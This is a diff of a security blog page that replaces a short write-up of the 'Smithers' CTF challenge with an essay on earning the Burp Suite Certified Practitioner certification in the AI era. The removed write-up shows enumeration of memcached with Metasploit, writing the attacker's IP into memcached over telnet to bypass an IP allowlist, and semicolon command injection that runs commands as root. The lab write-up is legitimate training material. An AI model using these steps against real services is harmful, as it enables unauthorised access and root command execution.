@@ -7,7 +7,7 @@
 <link rel="stylesheet" href="/_assets/css/chirpy.css" />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
 <script defer src="/_assets/js/main.js"></script>
-<link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+</head>
   <body>
     <div class="wrapper">
       <aside class="sidebar" role="navigation">
@@ -56,78 +56,45 @@
       <span class="sep">›</span>
       <a href="/archives">Archives</a>
       
-        <span class="sep">›</span>
-        <a href="/tags#topic:ctf">topic:ctf</a>
-      
     </div>
-    <h1>Smithers - Echo CTF Challenge</h1>
+    <h1>Why I Invested in the Burp Suite Certified Practitioner</h1>
     <div class="post-meta meta-line">
-      <span class="badge"><span class="dot"></span><time datetime="2025-02-15T16:54:47.104Z">2025-02-15</time></span>
+      <span class="badge"><span class="dot"></span><time datetime="2026-02-28T11:28:43.172Z">2026-02-28</time></span>
       
-      <span class="badge"><span class="dot"></span>1 min read</span>
+      <span class="badge"><span class="dot"></span>3 min read</span>
       
-      <span class="badge"><span class="dot"></span>topic:ctf</span>
+      
     </div>
-    <div class="post-content"><p><img src="/_resources/a6e7b38cb9944cc4ba6cb5ffb04cef74.png" /></p>
-<p><a title="https://echoctf.red/target/5" href="https://echoctf.red/target/5">Link to target</a></p>
-<h2 id="introduction">Introduction</h2>
-<p>This post details the process of solving the "Smithers" challenge on echoctf.red.</p>
-<h2 id="enumeration-phase">Enumeration Phase</h2>
-<h3 id="nmap-scan">Nmap Scan</h3>
-<p>I start the reconnaissance with nmap:</p>
-<div><pre class="hljs"><code>PORT      STATE SERVICE   VERSION
-<span class="hljs-number">10888</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>      nginx
-| <span class="hljs-keyword">http</span>-methods: 
-|_  Supported Methods: GET HEAD POST
-|<span class="hljs-title">_http-title</span>: Network Tools
-<span class="hljs-number">11211</span>/tcp <span class="hljs-built_in">open</span>  memcached Memcached <span class="hljs-number">1.5</span><span class="hljs-number">.12</span> (uptime <span class="hljs-number">224</span> <span class="hljs-built_in">seconds</span>)</code></pre></div>
-<h3 id="web-server-on-port-10888">Web Server on Port 10888</h3>
-<p>There is a web server running on port 10888:<br />
-<img src="/_resources/65833c4c20ff4cbabeb2779c06f9ad35.png" /></p>
-<p>It mentions that these utilities are only available to authorized IP addresses.</p>
-<h3 id="extracting-information-from-memcached-with-metasploit">Extracting Information from Memcached with Metasploit</h3>
-<p>I use Metasploit to extract information from the memcached service:</p>
-<div><pre class="hljs"><code>msf6 &gt; use auxiliary/gather/memcached_extractor
-
-msf6 auxiliary(gather/memcached<span class="hljs-emphasis">_extractor) &gt; set rhosts 10.0.100.142 
-rhosts =&gt; 10.0.100.142
-msf6 auxiliary(gather/memcached_</span>extractor) &gt; exploit
-
-[+] 10.0.100.142:11211    - Found 1 keys
-
-<span class="hljs-section">Keys/Values Found for 10.0.100.142:11211
-========================================</span>
-
-<span class="hljs-code"> Key     Value</span>
-<span class="hljs-code"> ---     -----</span>
-<span class="hljs-code"> ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_&lt;REDACTED&gt;\r\nEND\r\n"</span>
-</code></pre></div>
-<p>A flag is found in the memcached service.</p>
-<h2 id="exploitation-phase">Exploitation Phase</h2>
-<h3 id="using-telnet-to-modify-memcached">Using Telnet to Modify Memcached</h3>
-<p>The key is to store my IP address in the memcached service as <code>REMOTE_ADDR</code>. After some research, I use telnet to connect and store my IP address:</p>
-<div><pre class="hljs"><code><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.0.100.142</span> <span class="hljs-number">11211</span>
-<span class="hljs-attribute">Trying</span> <span class="hljs-number">10.0.100.142</span>...
-<span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.0.100.142</span>.
-<span class="hljs-attribute">Escape</span> character is '^]'.
-<span class="hljs-attribute">add</span> REMOTE_ADDR <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10</span>
-<span class="hljs-section">&lt;My IP&gt;</span>
-<span class="hljs-attribute">STORED</span></code></pre></div>
-<h3 id="accessing-the-web-server">Accessing the Web Server</h3>
-<p>Once my address is stored, I can access the web server, which presents a command line interface:<br />
-<img src="/_resources/4b2e3bd1f2054998b3142bfda29db88b.png" /></p>
-<p>Two flags are visible. Using a semicolon (<code>;</code>), I can run other commands and see that it runs as root. By executing:</p>
-<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -r <span class="hljs-string">'ETSCTF'</span> /</code></pre></div>
-<p>All flags are found.</p>
+    <div class="post-content"><h1 id="navigating-the-ai-era-why-i-invested-in-the-burp-suite-certified-practitioner-bscp">Navigating the AI Era: Why I Invested in the Burp Suite Certified Practitioner (BSCP)</h1>
+<p><img src="/_resources/35bc1797ba764529b660a23d994ac4d0.png" /></p>
+<p>Exactly one month ago, I officially achieved the Burp Suite Certified Practitioner (BSCP) certification. In the current technological landscape, pursuing a highly technical, manual testing certification might seem counterintuitive to some. Every corner of the internet is currently saturated with discussions about Artificial Intelligence, automation, and the looming anxiety that AI will inevitably replace human operators across the tech industry.</p>
+<p>However, it was precisely this environment that motivated my decision to invest significant time and resources into mastering the BSCP.</p>
+<h2 id="the-human-in-the-loop-imperative">The "Human in the Loop" Imperative</h2>
+<p>The narrative that AI will wholesale replace cybersecurity professionals fundamentally misunderstands how both AI and offensive security operate. AI models are exceptionally powerful tools for pattern recognition, data synthesis, and automating repetitive tasks. They will undoubtedly become integral to our workflows, assisting in reconnaissance, identifying low-hanging fruit, and suggesting potential attack vectors.</p>
+<p>Yet, the efficacy of these tools relies heavily on the "human in the loop." AI lacks true contextual understanding and the creative intuition required to chain the complex, multi-stage vulnerabilities inherent in modern web applications.</p>
+<h2 id="the-risk-of-delegating-without-understanding">The Risk of Delegating Without Understanding</h2>
+<p>This brings us to the core issue: relying on AI without a deep understanding of the underlying mechanics is a dangerous proposition.</p>
+<p>When an AI suggests an approach, the operator must understand exactly why that approach is valid, how it interacts with the target architecture, and how to troubleshoot when the initial attempt fails or is blocked by a Web Application Firewall. Without this fundamental knowledge, the human operator is reduced to blindly executing generated suggestions. An AI is only as effective as the professional guiding it; a lack of core knowledge guarantees that the AI will be utilized poorly.</p>
+<h2 id="why-the-bscp-matters-now">Why the BSCP Matters Now</h2>
+<p>The BSCP is renowned for being a grueling, practical examination of web application security. It does not merely test theoretical concepts; it demands the ability to identify, exploit, and chain vulnerabilities in a live, constrained environment under strict time limits.</p>
+<p>By pursuing the BSCP, I deliberately focused on the precise skills that AI currently struggles to replicate:</p>
+<ul>
+<li><strong>Contextual Analysis:</strong> Understanding the unique business logic of an application to identify unconventional, non-standard attack paths.</li>
+<li><strong>Vulnerability Chaining:</strong> Combining a seemingly low-impact vulnerability with a more critical flaw to achieve significant compromise.</li>
+<li><strong>Manual Verification:</strong> Developing the intuition to discern when an automated scanner—or an AI prompt—has produced a false positive or completely missed a subtle, critical vulnerability.</li>
+</ul>
+<h2 id="the-value-of-knowledge-in-an-uncertain-future">The Value of Knowledge in an Uncertain Future</h2>
+<p>I do not possess a crystal ball, and I cannot predict exactly what the cybersecurity landscape will look like in five or ten years. The capabilities of AI will undoubtedly evolve in ways we might not fully anticipate today. However, I am absolutely certain that deep technical knowledge retains immense value.</p>
+<p>Abandoning our core expertise and discarding years of foundational learning—simply because vocal individuals make grandiose, unverified claims about total automation and human replacement—would be a critical mistake. We cannot afford to discard our hard-earned skills based on the overhyped promises of those who claim we are already obsolete.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Ultimately, the BSCP was a strategic investment in foundational expertise. Whatever the future holds for our industry, maintaining a deep technical comprehension ensures that we remain the drivers of our security assessments, rather than passive operators relying on tools we do not fully understand. In an environment increasingly captivated by automated solutions and hype, solid technical knowledge remains the ultimate safeguard against failure.</p>
 </div>
 <nav class="post-nav" style="margin-top:1rem;">
   
   
-    <a href="/article/untitled">← CTF Report: 2Million</a>
-  
   
     <span style="float:right;">
-      <a href="/article/soccer-an-htb-easy-machine">Soccer - An HTB easy machine →</a>
+      <a href="/article/conversor-htb-complete-walkthrough">Conversor HTB - Complete Walkthrough →</a>
     </span>
   
 </nav>
